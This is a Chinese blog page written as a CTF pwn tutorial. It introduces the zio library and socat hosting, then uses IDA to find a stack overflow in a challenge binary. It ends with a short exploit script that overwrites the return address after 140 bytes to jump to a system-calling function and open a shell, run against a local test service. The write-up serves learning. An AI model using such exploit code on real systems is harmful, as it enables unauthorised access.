@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="试着写简单的exp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次基于zio编写pwn的exp的尝试">
+<meta property="og:url" content="https://bestwing.me/Based-on-zio-exp-first-attempt.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="试着写简单的exp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-02.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-03.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-04.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-05.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-06.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-07.jpg">
+<meta property="article:published_time" content="2016-10-22T08:35:01.000Z">
+<meta property="article:modified_time" content="2020-06-22T17:59:06.472Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="zio">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-01.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>一次基于zio编写pwn的exp的尝试</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/ichuqiu-pwn-November.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2016-sycgeek-Writeup.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/Based-on-zio-exp-first-attempt.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&text=一次基于zio编写pwn的exp的尝试"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&title=一次基于zio编写pwn的exp的尝试"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&is_video=false&description=一次基于zio编写pwn的exp的尝试"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一次基于zio编写pwn的exp的尝试&body=Check out this article: https://bestwing.me/Based-on-zio-exp-first-attempt.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&title=一次基于zio编写pwn的exp的尝试"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&title=一次基于zio编写pwn的exp的尝试"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&title=一次基于zio编写pwn的exp的尝试"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&title=一次基于zio编写pwn的exp的尝试"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&name=一次基于zio编写pwn的exp的尝试&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/Based-on-zio-exp-first-attempt.html&t=一次基于zio编写pwn的exp的尝试"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ZIO"><span class="toc-number">1.</span> <span class="toc-text">ZIO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ZIO%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">ZIO简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">与远程服务器建立连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">从远程服务器读取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%91%E8%BF%9C%E7%A8%8B%E6%95%B0%E6%8D%AE%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.3.</span> <span class="toc-text">向远程数据发送数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BB%BA%E7%AB%8Bshell%E4%BA%A4%E4%BA%92"><span class="toc-number">1.2.4.</span> <span class="toc-text">与服务器建立shell交互</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%A9pwn%E6%98%AF%E5%B0%91%E4%B8%8D%E4%BA%86%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%90%AD%E5%BB%BA%E7%9A%84"><span class="toc-number">2.</span> <span class="toc-text">玩pwn是少不了服务的搭建的</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">2.1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.2.</span> <span class="toc-text">使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%A4%8D%E7%94%A8"><span class="toc-number">2.1.3.</span> <span class="toc-text">第二次复用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp%E7%9A%84%E7%BC%96%E5%86%99"><span class="toc-number">4.</span> <span class="toc-text">exp的编写</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        一次基于zio编写pwn的exp的尝试
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2016-10-22T08:35:01.000Z" itemprop="datePublished">2016-10-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Other/">Other</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="tag-link-link" href="/tags/zio/" rel="tag">zio</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="ZIO"><a href="#ZIO" class="headerlink" title="ZIO"></a>ZIO</h1><h2 id="ZIO简介"><a href="#ZIO简介" class="headerlink" title="ZIO简介"></a>ZIO简介</h2><p>zio是一个专门为CTF PWN开发的Python库，基于zio可以方便实现对远程服务器上的服务程序进行数据读写操作。不仅如此，zio甚至还支持对本地程序的数据读写操作。<br>zio是一个开源项目，其在GitHub上的官方项目地址为 <a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a>。zio默认只支持Linux和Mac OSX系统，如果需要在Windows下使用可能需要额外安装一些Python扩展包，或者需要自己对zio的代码进行相关的修改</p>
+<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="与远程服务器建立连接"><a href="#与远程服务器建立连接" class="headerlink" title="与远程服务器建立连接"></a>与远程服务器建立连接</h3><p>zio(target)，其中target是一个元组，即(IP, PORT)，其中IP是字符串形式的IP地址，PORT是数字形式的端口号</p>
+<h3 id="从远程服务器读取数据"><a href="#从远程服务器读取数据" class="headerlink" title="从远程服务器读取数据"></a>从远程服务器读取数据</h3><ol>
+<li><p>read，直接从远程服务器读取数据；</p>
+</li>
+<li><p>readline，从远程服务器读取一行数据；</p>
+</li>
+<li><p>read_until(pattern)，从远程服务器读取数据，直到遇到pattern字符串</p>
+<h3 id="向远程数据发送数据"><a href="#向远程数据发送数据" class="headerlink" title="向远程数据发送数据"></a>向远程数据发送数据</h3></li>
+<li><p>write </p>
+</li>
+<li><p>writeline 向远程服务器写数据（在数据末尾自动添加换行符）</p>
+<h3 id="与服务器建立shell交互"><a href="#与服务器建立shell交互" class="headerlink" title="与服务器建立shell交互"></a>与服务器建立shell交互</h3><p>interact，在成功获取服务器控制权限之后，我们需要建立一个shell来对远程服务器进行管理，使用zio的interact函数即可完成这一功能。</p>
+<p>可以看到，基于zio编写代码省去了自己建立socat连接这一过程，而且使用zio封装的read/write接口替代socket的recv/send接口，使得代码更加具有可读性。</p>
+</li>
+</ol>
+<h1 id="玩pwn是少不了服务的搭建的"><a href="#玩pwn是少不了服务的搭建的" class="headerlink" title="玩pwn是少不了服务的搭建的"></a>玩pwn是少不了服务的搭建的</h1><p>虽然zio有自己建立socat的过程 但是却没有让程序在应该被监听的环境下</p>
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>apt-get insatll socat</p>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10002,fork EXEC:.&#x2F;pwn</span><br></pre></td></tr></table></figure>
+<h3 id="第二次复用"><a href="#第二次复用" class="headerlink" title="第二次复用"></a>第二次复用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:10002,reuseaddr,fork EXEC:~.&#x2F;CTF&#x2F;pwn</span><br></pre></td></tr></table></figure>
+<p>##　通用代码</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	curdir = os.path.abspath(os.getcwd())</span><br><span class="line">	num = curdir.split(<span class="string">&quot;/&quot;</span>)[<span class="number">-1</span>]</span><br><span class="line">	file = <span class="string">&quot;pwn&quot;</span> + num</span><br><span class="line">	cmd +[<span class="string">&quot;socat&quot;</span>,<span class="string">&quot;TCP-LISTEN:2333 %s,reuseaddr,fork&quot;</span> % num, <span class="string">&quot;EXEC:./%s&quot;</span> %file]</span><br><span class="line">	server.wait()</span><br></pre></td></tr></table></figure>
+<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>虽然开始玩pwn了 然而linux下的程序用<code>gdb</code>分析还是不怎么习惯 所以即使是这一次的博文，笔者也没有用多少的调试技巧 只是用 <code>IDA</code>看了看程序而已 依旧只是为未入门水平。 感叹阿<br>对程序的main函数试用IDA的F5功能 即将汇编转化成伪代码</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-01.jpg"></p>
+<p>这里有两个函数 一个是 <code>be_nice_to_people</code> 这个仅仅只是通过getegid获取进程的有效组ID（effective group ID），随后将有效组ID当作参数传递给setresgid函数。setresgid用于设置真实的、有效的和保存过的组标识号。综上所述，be_nice_to_people的作用就是设置pwn1进程自身的一些权限信息，这里不做过多介绍。</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-02.jpg"></p>
+<p>并没有可利用点</p>
+<p>还有一个函数是<code>vulnerable_function</code></p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-03.jpg"></p>
+<p>栈上定义了一个缓冲区，并通过<code>read</code>函数来读取数据存放到这个缓冲区里面（最多读取0x100个字节）<br>如果这里的<code>buf</code>比0x10小的话，那么这里就会有一个溢出 问题buf有多大呢？咱们继续分析 回到原来的汇编语言状态<br>  在IDA的“IDA View-A”选项卡中，可以看到vulnerable_function对应的反汇编指令列表如下图所示：</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-04.jpg"></p>
+<p>可以看出来这里缓冲区的起始地址为ebp-0x88，而read指定的字节数为0x100，那么显然这里就是一个溢出点<br>画个列表分析一下</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-05.jpg"></p>
+<p> 可以看出要覆盖到返回地址需要0x88 + 4 = 140字节的数据，即第141~144字节的数据可以用于覆盖函数的返回地址。</p>
+<p>在这之前我知道了pwn程序开启了NX（无法把栈上的数据当作代码来执行）（用checksec.sh可以检测出来）<br>所以我开始尝试看pwn程序中是否有调用system(“/bin/bash”)的代码，如果有的话直接控制EIP跳转过去执行即可。<br>现在继续使用IDA进行分析。在IDA中切换到Imports选项卡查看程序的导入函数列表，发现其中存在有对system函数的调用，如下图所示：</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-06.jpg"></p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-07.jpg"></p>
+<p>这里的not_called就是我们要找的函数，对应的地址为0x080484A4，我们控制EIP跳转到0x080484A4执行代码即可</p>
+<h1 id="exp的编写"><a href="#exp的编写" class="headerlink" title="exp的编写"></a>exp的编写</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp_pwn</span>()：</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">	# 调用<span class="title">zio</span>构造函数与服务器链接</span></span><br><span class="line">	io = zio((&#x27;127.0.0.1&#x27;,2333))</span><br><span class="line">	<span class="comment">#l32为zio提供的用于将32位整数（小端模式）转化为字符串的函数</span></span><br><span class="line"></span><br><span class="line">	ret_addr = l32(<span class="number">0x080484A4</span>)</span><br><span class="line">	<span class="comment"># 构造payload</span></span><br><span class="line">	payload =<span class="string">&#x27;A&#x27;</span>*<span class="number">140</span>+ret_addr</span><br><span class="line">	<span class="comment"># 发送数据</span></span><br><span class="line">	io.writeline(payload)</span><br><span class="line">	<span class="comment"># 获取服务器控制权限后形成的shell</span></span><br><span class="line">	io.interact()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> 	exp_pwn()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ZIO"><span class="toc-number">1.</span> <span class="toc-text">ZIO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ZIO%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">ZIO简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">与远程服务器建立连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">从远程服务器读取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%91%E8%BF%9C%E7%A8%8B%E6%95%B0%E6%8D%AE%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.3.</span> <span class="toc-text">向远程数据发送数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BB%BA%E7%AB%8Bshell%E4%BA%A4%E4%BA%92"><span class="toc-number">1.2.4.</span> <span class="toc-text">与服务器建立shell交互</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%A9pwn%E6%98%AF%E5%B0%91%E4%B8%8D%E4%BA%86%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%90%AD%E5%BB%BA%E7%9A%84"><span class="toc-number">2.</span> <span class="toc-text">玩pwn是少不了服务的搭建的</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">2.1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.2.</span> <span class="toc-text">使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%A4%8D%E7%94%A8"><span class="toc-number">2.1.3.</span> <span class="toc-text">第二次复用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp%E7%9A%84%E7%BC%96%E5%86%99"><span class="toc-number">4.</span> <span class="toc-text">exp的编写</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/Based-on-zio-exp-first-attempt.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&text=一次基于zio编写pwn的exp的尝试"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&title=一次基于zio编写pwn的exp的尝试"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&is_video=false&description=一次基于zio编写pwn的exp的尝试"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一次基于zio编写pwn的exp的尝试&body=Check out this article: https://bestwing.me/Based-on-zio-exp-first-attempt.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&title=一次基于zio编写pwn的exp的尝试"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&title=一次基于zio编写pwn的exp的尝试"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&title=一次基于zio编写pwn的exp的尝试"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&title=一次基于zio编写pwn的exp的尝试"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/Based-on-zio-exp-first-attempt.html&name=一次基于zio编写pwn的exp的尝试&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/Based-on-zio-exp-first-attempt.html&t=一次基于zio编写pwn的exp的尝试"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
